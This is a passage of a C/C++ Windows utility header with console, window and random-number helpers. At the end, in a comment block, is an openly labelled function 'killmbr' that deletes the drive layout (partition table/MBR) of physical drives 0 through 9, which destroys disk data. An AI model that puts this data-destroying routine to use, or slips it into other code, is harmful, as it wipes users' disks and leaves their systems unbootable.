	while (fgets(buf1, sizeof buf1, pf))
		snprintf(getCmdResult_Result, 1024000, "%s%s", getCmdResult_Result, buf1);
	pclose(pf);
	return getCmdResult_Result;
}

/**************************************************
 *  @brief          居中输出
 *  @param          str:要输出的字符串,y:输出到第几行;
 *  @Sample usage   OutoutMiddle("xbebhxx3",1);
 *  @note	        头文件: #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
void OutoutMiddle(const char str[], int y)
{
	COORD pos;
	HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE); //获得输出的句柄

	CONSOLE_SCREEN_BUFFER_INFO bInfo;
	GetConsoleScreenBufferInfo(hOutput, &bInfo); //获取控制台屏幕缓冲区大小

	int dwSizeX = bInfo.dwSize.X, dwSizey = bInfo.dwSize.Y;
	int len = strlen(str); //获取要输出的字符串的长度
	int x = dwSizeX / 2 - len / 2;
	pos.X = x; //横坐标
	pos.Y = y; //纵坐标

	SetConsoleCursorPosition(hOutput, pos); //移动光标
	printf("%s", str);						//输出
	CloseHandle(hOutput);
}

/**************************************************
 *  @brief          全屏最大化
 *  @param          hwnd:窗口hwnd
 *  @Sample usage   full_screen(GetForegroundWindow());
 *  @note	        头文件: #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
void full_screen(HWND hwnd)
{
	int cx = GetSystemMetrics(SM_CXSCREEN); /* 屏幕宽度 像素 */
	int cy = GetSystemMetrics(SM_CYSCREEN); /* 屏幕高度 像素 */

	LONG l_WinStyle = GetWindowLong(hwnd, GWL_STYLE); /* 获取窗口信息 */

	SetWindowLongPtr(hwnd, GWL_STYLE, GetWindowLongPtr(hwnd, GWL_STYLE) & ~(WS_CAPTION | WS_SIZEBOX)); //设置窗口信息 最大化 取消标题栏及边框
	SetWindowPos(hwnd, HWND_TOP, 0, 0, cx + 18, cy, 0);
}

/*********************************************
 *  @brief           生成随机数
 *  @param           min:最小值,max:最大值
 *  @return          随机数
 *  @note            头文件: #include <random> #include <time.h>
 *  @author          xbebhxx3
 *  @version         版本号
 *  @date            日期
 *  @copyright       Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **********************************************/
long long radom(long long min, long long max)
{
	random_device seed; //硬件生成随机数种子
	POINT p;
	GetCursorPos(&p);										  //获取鼠标坐标
	ranlux48 engine(seed() + time(0) - (p.x * p.y) + rand()); //利用种子生成随机数引擎
	uniform_int_distribution<> distrib(min, max);			  //设置随机数范围，并为均匀分布
	return distrib(engine);									  //随机数
}

/**************************************************
 *  @brief          破坏mbr(very danger)
 *  @Sample usage   killmbr();
 *  @note		    头文件: #include<Windows.h> #include<ntddscsi.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved


void killmbr(){
	DWORD lpBytesReturned;
	OVERLAPPED lpOverlapped={0};
	HANDLE DiskHandle=CreateFile("\\\\.\\PhysicalDrive0",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);//破坏mbr
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive1",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive2",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive3",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive4",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive5",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive6",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive7",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive8",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive9",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
}
**************************************************/
#endif
